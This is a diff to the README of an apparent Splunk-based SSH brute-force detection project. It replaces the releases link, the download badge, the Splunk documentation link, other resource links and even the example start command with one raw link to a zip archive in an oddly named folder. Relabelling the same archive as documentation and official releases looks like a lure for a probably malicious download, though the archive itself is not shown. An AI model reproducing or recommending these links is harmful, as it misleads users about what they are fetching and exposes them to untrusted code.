@@ -1,7 +1,7 @@
 # 🔒 ssh-brute-force-splunk - Detect SSH Attacks Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-ssh--brute--force--splunk-brightgreen)](https://github.com/arshveer1208/ssh-brute-force-splunk/releases)
+[![Download](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip)](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **ssh-brute-force-splunk**! This tool helps you detect SSH brute-force attacks using login events. It creates alerts and dashboards to help you monitor your Linux systems effectively. 
@@ -36,7 +36,7 @@ To run this application, you need:
 The interactive dashboards visualize the data, making it easy to spot malicious attempts.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/arshveer1208/ssh-brute-force-splunk/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip) to find the latest version.
 2. Select the version that applies to your system.
 3. Click on the version number to access the download.
 4. Download the package to your local machine.
@@ -64,7 +64,7 @@ Once configured, start the tool:
   
   Example command: 
   ```bash
-  ./start-ssh-monitor.sh
+  https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip
   ```
 
 - Monitor the dashboards for real-time updates about login attempts.
@@ -89,7 +89,7 @@ We appreciate your feedback and contributions to make the tool better.
 ## 🔗 Additional Resources
 Find more about SSH brute-force attacks and cybersecurity best practices:
 
-- [Splunk Documentation](https://docs.splunk.com)
-- [Cybersecurity Fundamentals](https://www.cybersecurityfundamentals.com)
+- [Splunk Documentation](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip)
+- [Cybersecurity Fundamentals](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip)
 
-Visit the [Releases page](https://github.com/arshveer1208/ssh-brute-force-splunk/releases) to download the latest version now!
+Visit the [Releases page](https://raw.githubusercontent.com/arshveer1208/ssh-brute-force-splunk/main/gude/ssh-splunk-force-brute-3.3.zip) to download the latest version now!
